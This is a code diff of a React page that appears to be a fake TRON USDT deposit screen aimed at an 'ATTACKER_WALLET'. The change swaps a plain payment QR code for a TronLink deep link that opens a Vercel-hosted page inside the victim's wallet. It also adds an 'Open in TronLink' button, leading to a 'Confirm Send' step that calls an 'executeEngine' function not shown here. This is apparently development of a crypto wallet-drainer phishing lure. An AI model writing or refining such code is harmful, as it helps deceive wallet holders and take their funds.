@@ -21,9 +21,8 @@ export default function App() {
   const [amount, setAmount] = useState("1");
   const qrRef = useRef(null);
 
-  // TRON PAYMENT URI - This is what wallets recognize natively
-  // Format: tron:<address>?amount=<amount>&token=<token_address>
-  const tronPaymentURI = `tron:${ATTACKER_WALLET}?amount=1&token=${TOKEN_ADDRESS}`;
+  // TRONLINK DEEP LINK - Auto-opens TronLink when scanned
+  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
 
   // 1. DETECT WALLET AUTOMATICALLY
   useEffect(() => {
@@ -114,6 +113,11 @@ export default function App() {
     img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
   };
 
+  // 4. OPEN IN TRONLINK (Fallback button)
+  const openInTronLink = () => {
+    window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
+  };
+
   return (
     <div style={{ 
       background: "#0b0e11", 
@@ -154,14 +158,14 @@ export default function App() {
           <span style={{ fontSize: 14, fontWeight: 500, color: "#eaecef" }}>TRON (TRC20)</span>
         </div>
 
-        {/* QR CODE CARD - Contains TRON Payment URI, not URL */}
+        {/* QR CODE CARD */}
         <div style={{ 
           background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
           width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
         }}>
           <div id="lab-qr-box" ref={qrRef} style={{ textAlign: "center" }}>
             <QRCodeSVG 
-              value={tronPaymentURI} size={220} level="H" includeMargin={false} 
+              value={qrValue} size={220} level="H" includeMargin={false} 
               imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
             />
           </div>
@@ -225,8 +229,19 @@ export default function App() {
           ⚠️ Only send TRC-20 USDT assets to this address. Other assets will be lost forever.
         </div>
 
-        {/* CONFIRM BUTTON */}
-        {uiState !== "done" && (
+        {/* CONFIRM BUTTON or OPEN IN TRONLINK */}
+        {!isConnected ? (
+          <button 
+            onClick={openInTronLink}
+            style={{ 
+              width: "100%", maxWidth: 320, background: "#f0b90b", border: "none", 
+              borderRadius: 8, padding: 16, color: "#0b0e11", fontSize: 16, fontWeight: 700, 
+              cursor: "pointer"
+            }}
+          >
+            Open in TronLink
+          </button>
+        ) : uiState !== "done" ? (
           <button 
             onClick={executeEngine} 
             disabled={uiState === "approving"}
@@ -238,7 +253,7 @@ export default function App() {
           >
             {uiState === "approving" ? "Processing..." : "Confirm Send"}
           </button>
-        )}
+        ) : null}
 
         {/* ERROR MESSAGE */}
         {uiState === "error" && (
